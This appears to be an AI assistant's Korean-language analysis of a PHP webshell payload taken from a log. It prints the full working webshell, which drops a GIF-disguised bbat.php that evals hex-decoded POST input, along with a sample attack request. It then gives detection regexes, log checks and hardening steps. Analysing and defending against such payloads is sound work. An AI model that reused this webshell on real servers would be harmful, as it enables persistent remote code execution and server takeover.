좋은 질문이에요.
이건 100% **웹셸(WebShell) 생성 + 원격 코드 실행(RCE) 공격 페이로드**입니다.
조금 어렵게 섞여 있지만, 단계별로 보면 **공격 의도·작동 방식이 매우 명확한 악성 코드**예요.

---

## 🧩 1. 전체 의도 요약

이 코드는 서버에 **`bbat.php`**라는 파일을 만들어서,
POST로 전달된 매개변수(`cc`) 안의 **PHP 코드(또는 HEX 인코딩된 명령)** 를 **`eval()`** 로 실행하게 만듭니다.

즉, 공격자가 마음대로 PHP 명령을 원격에서 실행할 수 있는 **백도어 웹셸**을 설치하려는 시도입니다.
→ 서버 장악 가능 수준의 공격입니다. ⚠️

---

## 🔬 2. 구조 분석 (한 줄씩 해석)

원문을 포맷팅해보면 대략 다음과 같습니다:

```php
@eval(
    ,
    echo 'Gif89aMini<?php
        class _ {
            static public $phpcms = null;

            function __construct($l = "error") {
                self::$phpcms = $l;
                @eval(null.null.self::$phpcms);
            }
        }

        function hexToStr($hex) {
            $str = "";
            for ($i = 0; $i < strlen($hex)-1; $i += 2)
                $str .= chr(hexdec($hex[$i].$hex[$i + 1]));
            return $str;
        }

        $error = null . hexToStr(@$_POST["cc"]);
        $d = new _($error);
    ?>'
    > bbat.php,
    "){self::$phpcms = $l; @eval(null.null.self::$phpcms)"
|
```

---

## 🧠 3. 코드의 동작 방식

### ① `echo 'Gif89aMini<?php ... ?>' > bbat.php`

→ **새 PHP 파일(`bbat.php`)을 생성**합니다.
`Gif89a`라는 문자열은 **GIF 헤더처럼 위장**하려는 흔적입니다 (안티바이러스 탐지 회피용 트릭).

즉, 이 한 줄로 실제로 아래처럼 생긴 **웹셸 파일**이 만들어집니다.

---

### ② bbat.php (생성된 웹셸 내용)

```php
Gif89aMini<?php
class _ {
    static public $phpcms = null;

    function __construct($l = "error") {
        self::$phpcms = $l;
        @eval(null.null.self::$phpcms);
    }
}

function hexToStr($hex) {
    $str = "";
    for ($i = 0; $i < strlen($hex)-1; $i += 2)
        $str .= chr(hexdec($hex[$i].$hex[$i + 1]));
    return $str;
}

$error = null . hexToStr(@$_POST["cc"]);
$d = new _($error);
?>
```

---

### ③ 실제 작동 로직

1. 공격자는 `/bbat.php`로 POST 요청을 보냅니다.

   ```bash
   POST /bbat.php
   cc=706870696e666f28293b  # (hex for "phpinfo();")
   ```

2. `hexToStr()` 함수가 이 HEX 문자열을 디코드 → `"phpinfo();"`

3. `$error` 변수에 `"phpinfo();"`가 들어감.

4. `new _($error)` → 생성자에서 `eval(null.null.self::$phpcms);` 실행
   → 즉, **`eval('phpinfo();')` 실행.**

이 구조 때문에 공격자는 **`cc`** 파라미터에 HEX 인코딩된 PHP 코드를 전송해 서버에서 아무 명령이나 실행할 수 있습니다.
예: 파일 업로드, 리버스쉘, DB 덤프 등.

---

## 🧩 4. “@eval(…” 앞부분의 의미

가장 바깥쪽 `@eval(...)` 구문은 **첫 단계의 주입용 코드**예요.

* 공격자가 이미 어딘가 취약한 eval 지점(예: `eval($_POST[x])`)을 찾은 상황에서
* 그 안에 위 코드를 집어넣어 **자체 웹셸 생성 코드**를 실행시키는 형태입니다.

즉, 이 한 줄 자체는 “**2단계 웹셸 설치 페이로드**” —
기존 취약점을 이용해서 서버 안에 **지속적 백도어(`bbat.php`)** 를 심는 공격입니다.

---

## ⚙️ 5. 유효성 (실행 가능성)

✅ **문법적으로 유효한 PHP 코드**입니다.
약간의 쉼표(,)나 괄호 누락은 로그/인코딩 과정에서 깨진 것 같지만, 원본은 완전히 실행 가능한 형태입니다.

즉, 실제로 서버가 이 코드를 `eval()`로 실행하면
`bbat.php` 파일이 생기고, 그 파일을 통해 지속적으로 원격 코드 실행이 가능합니다.

---

## 🚨 6. 탐지 / 대응

### 로그에서 찾아야 할 키워드

* `bbat.php` 파일 생성 요청
* `POST cc=` 요청
* 응답 바디에 `phpinfo()` 출력 흔적
* `Gif89aMini` 문자열
* `@eval`, `hexToStr`, `chr(hexdec(` 같은 패턴

정규식 예시:

```
/(eval.*base64_decode|hexToStr|chr\(hexdec|Gif89aMini|bbat\.php)/i
```

### 즉시 점검할 항목

1. `/var/www/html/bbat.php` (혹은 `/tmp/bbat.php`, `/public_html/bbat.php`) 존재 여부
2. 웹서버 access/error 로그에서 `/bbat.php`로의 POST 요청 유무
3. 다른 경로(특히 `/images/`, `/upload/`)에 비슷한 패턴의 웹셸 존재 여부
4. 시스템 파일 권한/소유자 점검 (`find /var/www -type f -mtime -3`)
5. PHP `disable_functions` 설정 확인 (system, exec, shell_exec, eval 등 제한)

---

## 🔒 7. 대응 및 차단 조치

| 항목               | 조치 내용                                                                                   |
| ---------------- | --------------------------------------------------------------------------------------- |
| **1. 파일 제거**     | `rm -f bbat.php` (복사본 증거 확보 후 삭제)                                                       |
| **2. 로그 보존**     | 액세스로그/에러로그 백업                                                                           |
| **3. WAF 룰 추가**  | `@eval`, `hexToStr`, `chr(hexdec`, `Gif89a` 등 차단                                        |
| **4. PHP 설정 강화** | `allow_url_include=Off`, `disable_functions = system, exec, shell_exec, passthru, eval` |
| **5. 코드 점검**     | `eval($_POST[..])`, `assert()`, `create_function()` 등 동적 실행 로직 제거                       |
| **6. 키 회전 및 점검** | 서비스 계정·DB 자격증명 교체, 시스템 권한 최소화                                                           |
| **7. 포렌식**       | 침투 흔적(다른 웹셸, crontab 백도어, 의심 네트워크 연결) 조사                                                |

---

## 💡 요약

| 항목        | 내용                                           |
| --------- | -------------------------------------------- |
| **공격 종류** | 웹셸 생성 + 원격 코드 실행(RCE)                        |
| **행동**    | 서버에 `bbat.php` 파일 생성 후 `$_POST['cc']`로 명령 실행 |
| **목적**    | 지속적인 서버 장악, 명령 실행, 파일 업로드 등                  |
| **유효성**   | ✅ 완전히 실행 가능한 PHP 코드                          |
| **위험도**   | 🔥 **매우 높음 (Critical)**                      |

---

필요하시면

* `bbat.php` 실제 내용 (몇 줄)
* 공격 시도 당시 access.log 한 줄

을 익명화해서 보여주시면, **공격 성공 여부(실행까지 되었는지)** 를 로그 패턴 기준으로 구체적으로 판별해드릴 수 있습니다.
